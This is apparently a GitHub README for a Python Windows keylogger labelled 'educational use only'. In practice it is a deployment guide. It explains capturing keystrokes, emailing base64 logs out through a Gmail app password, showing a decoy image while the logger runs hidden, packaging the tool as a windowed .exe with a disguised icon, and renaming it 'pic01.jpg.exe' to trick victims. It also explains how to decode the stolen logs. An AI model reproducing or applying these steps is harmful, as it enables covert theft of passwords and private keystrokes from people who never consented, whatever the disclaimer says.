# 🔑 Python Keylogger for Windows (Educational Use Only)

<div align="center">

[![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://windows.microsoft.com)
[![Gmail](https://img.shields.io/badge/Gmail-D14836?style=for-the-badge&logo=gmail&logoColor=white)](https://gmail.com)

</div>

> ⚠️ **CRITICAL WARNING**:  
> This project is for **EDUCATIONAL USE ONLY**—never use it on any computer or account without explicit, informed consent. Unauthorized use is **illegal** and punishable by law.

---

## 📖 Overview

This repository demonstrates basic **keylogger and data exfiltration concepts** for cybersecurity education, including:

- **Keystroke capture** using `pynput`
- **Obfuscated, random log file creation**
- **Automatic keystroke emailing via Gmail**
- **User deception: shows a benign image on launch while the logger runs in the background**

---

## 🗂️ Project Structure

Keylogger/
├─ main.py # Main script containing the keylogger logic (see below)
├─ walpaper.jpg # Image shown to user (can use any .jpg, rename as needed)

---

## ⚙️ Setup & Configuration

### 1. Clone or Download the Repository
```
git clone https://github.com/Dawn-Fighter/Keylogger.git
cd Keylogger
```


### 2. Install Dependencies
```
pip install pynput pillow
```


### 3. Gmail App Password Configuration

**You must use a Gmail App Password, not your normal account password.**

- Go to [Google Account – Security](https://myaccount.google.com/security)
- Enable 2-Step Verification
- Generate an "App Password" for "Mail" (16 characters)
- **Never share your App Password!**

### 4. Add Your Credentials to the Script

Open `keylogger.py` and find the following section inside the `tx(lf)` function:

s, r, pw = "", "", ""



Replace with your actual details:

s = "your.email@gmail.com" # Sender Gmail address
r = "logs.receiver@gmail.com" # Recipient email address (can be the same as sender)
pw = "your-16-char-app-password" # Your Gmail app password



**Example**:

s, r, pw = "mylogsender@gmail.com", "mydest@gmail.com", "abcd efgh ijkl mnop"


- **`s`**: Your sending Gmail address
- **`r`**: Email address to receive log files
- **`pw`**: Gmail App Password (not your main Gmail password)

---

## 🖼️ Add Your Display Image

- Place your actual image as `walpaper.jpg` in the **same folder** as `keylogger.py`.
    - Or change `"walpaper.jpg"` to your own image filename in the script.

---

## 💻 Usage

### A. Running as a Python Script
```
python main.py

```


- Briefly displays the image.
- Runs the keylogger silently in the background.
- Sends encrypted (base64) keystroke logs via email every 200–450 seconds.
- Terminates only when you kill the process (e.g., via Task Manager).

### B. Converting to a Standalone `.exe` (Optional)

1. **Install PyInstaller:**
    ```
    pip install pyinstaller
    ```
2. **Bundle the image with your exe:**
    ```
    pyinstaller --onefile --windowed --add-data "walpaper.jpg;." keylogger.py
    ```
    - The exe will appear in the `dist/` folder.
    - For a disguised icon, convert your image to `.ico` and add `--icon=youricon.ico`.

3. **Rename Output for Camouflage:**
    - Example: `pic01.jpg.exe`
    - **Note**: Only users with file extensions hidden will see it as an image.

---

## 📨 Reading the Logs

The received attachment (`.dat` file) is base64-encoded keystrokes. To decode:

### On Windows (using certutil):
```
certutil -decode yourfile.dat output.txt
```

### On Linux/macOS:
```
base64 -d yourfile.dat > output.txt
```

Or use any online Base64 decoder.

---

## 🛡️ Security, Ethics & Disclaimer

- **Educational use only**: Never run on another person's computer or network.
- **Antivirus detection**: Modern AV products will likely flag and quarantine this executable.
- **You are fully responsible** for any legal or ethical violations resulting from misuse.

---

## 📄 License

MIT License. See `LICENSE` for details.

---

<div align="center">

**Made with ❤️ for Cybersecurity Education**

</div>

---

